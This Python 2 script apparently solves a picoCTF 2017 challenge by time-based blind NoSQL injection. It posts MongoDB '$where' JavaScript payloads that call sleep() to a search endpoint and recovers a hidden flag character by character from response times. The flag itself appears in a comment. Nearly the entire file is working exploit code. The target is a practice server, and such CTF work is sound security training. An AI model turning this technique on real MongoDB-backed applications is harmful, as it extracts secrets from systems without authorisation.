#! /usr/bin/env python2

import json
import urllib2
import string

# flag = "flag{I_only_eat_0rg4n1c_flages}"
flag = ""

print string.ascii_letters + string.digits + string.punctuation + " "

while True:
    found = False
    for c in string.ascii_letters + string.digits + string.punctuation + " ":
        if c == "\"":
            c = "\\\""
        if c == "\\":
            c = "\\\\"
        rq = 'function(){ sleep((obj.name.includes("Flag") && ' + \
             'obj.flag.substring(0, {}) == "{}")'.format(len(flag + c), flag + c) + \
             ' ? 1000 : 1); return true; }'
        # rq = 'function(){ sleep(obj.name.includes("Flag' + "{}".format(flag + c) + \
        #      '") ? 1000 : 1); return true; }'
        d = {'$where': rq}
        # print "trying: " + flag + c
        # print json.dumps(d)
        # print ""
        r = urllib2.Request("http://shell2017.picoctf.com:8080/search",
                json.dumps(d),
                {'Content-Type': 'application/json'})
        f = urllib2.urlopen(r)
        res = f.read()
        f.close()
        js = json.loads(res)
        if js['time'] >= 500:
            found = True
            flag += c
            break

    if found:
        print flag
    else:
        break

print "flag = " + flag
